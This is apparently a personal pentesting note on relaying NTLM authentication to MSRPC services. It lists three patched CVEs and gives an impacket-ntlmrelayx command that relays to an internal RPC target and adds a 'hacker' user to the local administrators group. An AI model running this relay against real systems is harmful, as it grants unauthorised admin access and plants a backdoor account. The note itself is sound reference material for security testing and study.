---
title: NTLM Relay to MSRPC
---

There is no equivalent to SMB Singing on [[notes/network/msrpc]].
Every service defines integrity verification requirements itself.
This lead to the discovery of multiple services that can be used as [[notes/ad/ntlm-relay-sink]]:

- ITaskSchedulerService, [CVE-2020-1113](http://web.archive.org/web/20221028195609/https://blog.compass-security.com/2020/05/relaying-ntlm-authentication-over-rpc/), patched since May 2020
- IRemoteWinSpool, [CVE-2021-1678](http://web.archive.org/web/20221013042137/https://www.crowdstrike.com/blog/cve-2021-1678-printer-spooler-relay-security-advisory/), patched since January 2021
- DCOM, [CVE-2021-26414](http://web.archive.org/web/20230528140317/https://blog.compass-security.com/2021/08/relaying-ntlm-authentication-over-rpc-again/), patched since June 2022 (?)

Relay account with local admin privileges to RPC.

=== "[[notes/tools/impacket]]"
    ~~~ bash
    impacket-ntlmrelayx -t rpc://172.16.100.1 -c 'net user hacker P@ssw0rd /add && net localgroup administrators hacker /add'
    ~~~
